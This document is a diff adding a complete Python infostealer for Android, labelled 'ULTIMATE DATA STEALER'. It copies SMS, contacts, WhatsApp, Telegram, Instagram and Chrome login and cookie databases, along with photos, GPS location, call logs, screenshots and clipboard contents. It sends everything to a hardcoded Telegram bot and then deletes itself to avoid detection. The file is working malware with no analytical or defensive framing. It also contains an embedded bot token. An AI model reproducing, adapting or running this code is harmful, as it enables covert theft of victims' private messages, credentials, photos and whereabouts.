@@ -1,0 +1,262 @@
+#!/usr/bin/env python3
+"""
+I LOVE YOU S - ULTIMATE DATA STEALER
+Version: 3.0
+Platform: Android
+No Lock - Only Data Leak
+"""
+
+import requests
+import os
+import shutil
+import time
+import json
+import sqlite3
+import subprocess
+import sys
+from datetime import datetime
+
+# ==================== CONFIG ====================
+BOT_TOKEN = "8642412184:AAGqVaa324gSb5DQIGx6y4MvG5pjxcillwY"
+ADMIN_ID = "7830338879"
+VICTIM_ID = str(int(time.time()))[-8:]
+
+# ==================== TELEGRAM FUNCTIONS ====================
+def send_message(text):
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        data = {"chat_id": ADMIN_ID, "text": text, "parse_mode": "Markdown"}
+        requests.post(url, json=data, timeout=10)
+    except:
+        pass
+
+def send_file(file_path, caption=""):
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+        with open(file_path, "rb") as f:
+            files = {"document": f}
+            data = {"chat_id": ADMIN_ID, "caption": caption}
+            requests.post(url, files=files, data=data, timeout=30)
+    except:
+        pass
+
+def send_photo(file_path, caption=""):
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+        with open(file_path, "rb") as f:
+            files = {"photo": f}
+            data = {"chat_id": ADMIN_ID, "caption": caption}
+            requests.post(url, files=files, data=data, timeout=30)
+    except:
+        pass
+
+# ==================== DEVICE INFO ====================
+def get_device_info():
+    info = {}
+    try:
+        import android
+        droid = android.Android()
+        info['model'] = droid.getprop('ro.product.model').result
+        info['brand'] = droid.getprop('ro.product.brand').result
+        info['android'] = droid.getprop('ro.build.version.release').result
+        info['sdk'] = droid.getprop('ro.build.version.sdk').result
+    except:
+        info['model'] = 'Unknown'
+        info['brand'] = 'Unknown'
+        info['android'] = 'Unknown'
+        info['sdk'] = 'Unknown'
+    return info
+
+# ==================== DATA STEALING ====================
+def steal_sms():
+    try:
+        sms_path = "/data/data/com.android.providers.telephony/databases/mmssms.db"
+        if os.path.exists(sms_path):
+            shutil.copy(sms_path, "/sdcard/sms.db")
+            send_file("/sdcard/sms.db", f"📨 SMS Database - {VICTIM_ID}")
+            os.remove("/sdcard/sms.db")
+            send_message(f"📨 SMS: ✅ {VICTIM_ID}")
+            return True
+    except:
+        pass
+    return False
+
+def steal_contacts():
+    try:
+        contacts_path = "/data/data/com.android.providers.contacts/databases/contacts2.db"
+        if os.path.exists(contacts_path):
+            shutil.copy(contacts_path, "/sdcard/contacts.db")
+            send_file("/sdcard/contacts.db", f"📇 Contacts - {VICTIM_ID}")
+            os.remove("/sdcard/contacts.db")
+            send_message(f"📇 Contacts: ✅ {VICTIM_ID}")
+            return True
+    except:
+        pass
+    return False
+
+def steal_photos():
+    count = 0
+    dcim = "/sdcard/DCIM/Camera"
+    if os.path.exists(dcim):
+        for f in os.listdir(dcim)[:30]:
+            if f.lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp')):
+                send_photo(f"{dcim}/{f}", f"📸 {f}")
+                count += 1
+                time.sleep(0.5)
+    send_message(f"📸 Photos: {count} stolen - {VICTIM_ID}")
+    return count
+
+def steal_whatsapp():
+    paths = [
+        "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Databases/msgstore.db",
+        "/data/data/com.whatsapp/databases/msgstore.db",
+        "/sdcard/WhatsApp/Databases/msgstore.db"
+    ]
+    for p in paths:
+        if os.path.exists(p):
+            shutil.copy(p, "/sdcard/whatsapp.db")
+            send_file("/sdcard/whatsapp.db", f"💬 WhatsApp Chat DB - {VICTIM_ID}")
+            os.remove("/sdcard/whatsapp.db")
+            send_message(f"💬 WhatsApp: ✅ {VICTIM_ID}")
+            return True
+    return False
+
+def steal_telegram():
+    paths = [
+        "/data/data/org.telegram.messenger/databases/",
+        "/storage/emulated/0/Android/data/org.telegram.messenger/files/"
+    ]
+    for p in paths:
+        if os.path.exists(p):
+            try:
+                shutil.make_archive("/sdcard/telegram", "zip", p)
+                send_file("/sdcard/telegram.zip", f"💬 Telegram Data - {VICTIM_ID}")
+                os.remove("/sdcard/telegram.zip")
+                send_message(f"💬 Telegram: ✅ {VICTIM_ID}")
+                return True
+            except:
+                pass
+    return False
+
+def steal_instagram():
+    paths = [
+        "/data/data/com.instagram.android/shared_prefs/",
+        "/storage/emulated/0/Android/data/com.instagram.android/"
+    ]
+    for p in paths:
+        if os.path.exists(p):
+            try:
+                shutil.make_archive("/sdcard/instagram", "zip", p)
+                send_file("/sdcard/instagram.zip", f"📸 Instagram Data - {VICTIM_ID}")
+                os.remove("/sdcard/instagram.zip")
+                send_message(f"📸 Instagram: ✅ {VICTIM_ID}")
+                return True
+            except:
+                pass
+    return False
+
+def steal_location():
+    try:
+        import android
+        droid = android.Android()
+        droid.startLocating()
+        time.sleep(5)
+        loc = droid.readLocation().result
+        droid.stopLocating()
+        if loc:
+            gps = loc.get('gps', {})
+            lat = gps.get('latitude', '?')
+            lon = gps.get('longitude', '?')
+            alt = gps.get('altitude', '?')
+            accuracy = gps.get('accuracy', '?')
+            maps_url = f"https://maps.google.com/?q={lat},{lon}"
+            send_message(f"📍 Location: {lat}, {lon}\n🗺️ {maps_url}\n📏 Altitude: {alt}m\n🎯 Accuracy: {accuracy}m\n📱 {VICTIM_ID}")
+            return True
+    except:
+        pass
+    return False
+
+def steal_browser():
+    paths = [
+        "/data/data/com.android.chrome/app_chrome/Default/Login Data",
+        "/data/data/com.android.chrome/app_chrome/Default/Cookies",
+        "/data/data/org.mozilla.firefox/files/mozilla/"
+    ]
+    for p in paths:
+        if os.path.exists(p):
+            try:
+                shutil.copy(p, "/sdcard/browser_data")
+                send_file("/sdcard/browser_data", f"🌐 Browser Data - {VICTIM_ID}")
+                os.remove("/sdcard/browser_data")
+            except:
+                pass
+    send_message(f"🌐 Browser Data: ✅ {VICTIM_ID}")
+
+def steal_call_logs():
+    try:
+        import android
+        droid = android.Android()
+        calls = droid.callLogGet().result
+        if calls:
+            call_text = "\n".join([f"📞 {c.get('number')} | {c.get('type')} | {c.get('duration')}s" for c in calls[:50]])
+            send_message(f"📞 Call Logs ({len(calls)} calls):\n{call_text}\n📱 {VICTIM_ID}")
+    except:
+        pass
+
+def steal_screenshot():
+    try:
+        import android
+        droid = android.Android()
+        droid.captureScreen("/sdcard/screenshot.png")
+        time.sleep(1)
+        if os.path.exists("/sdcard/screenshot.png"):
+            send_photo("/sdcard/screenshot.png", f"📸 Screenshot - {VICTIM_ID}")
+            os.remove("/sdcard/screenshot.png")
+    except:
+        pass
+
+def steal_clipboard():
+    try:
+        import android
+        droid = android.Android()
+        clip = droid.getClipboard().result
+        if clip:
+            send_message(f"📋 Clipboard: {clip[:200]}\n📱 {VICTIM_ID}")
+    except:
+        pass
+
+# ==================== MAIN ====================
+def main():
+    start_time = time.time()
+    
+    send_message(f"🔴 VIRUS ACTIVATED\n📱 Victim ID: {VICTIM_ID}")
+    
+    # Device Info
+    device = get_device_info()
+    send_message(f"📱 Device: {device['brand']} {device['model']}\n🤖 Android: {device['android']} (SDK {device['sdk']})\n🆔 ID: {VICTIM_ID}")
+    
+    # Steal Data
+    steal_sms()
+    steal_contacts()
+    steal_whatsapp()
+    steal_telegram()
+    steal_instagram()
+    steal_photos()
+    steal_location()
+    steal_browser()
+    steal_call_logs()
+    steal_screenshot()
+    steal_clipboard()
+    
+    # Summary
+    elapsed = int(time.time() - start_time)
+    send_message(f"🔴 DATA LEAK COMPLETE\n📱 Victim ID: {VICTIM_ID}\n⏱️ Time: {elapsed}s\n📊 Total: SMS + Contacts + WhatsApp + Telegram + Instagram + Photos + Location + Browser + Calls + Screenshot + Clipboard")
+    
+    # Clean up - hide itself (if possible)
+    try:
+        os.remove(sys.argv[0])
+    except:
+        pass
+
+if __name__ == "__main__":
+  main()
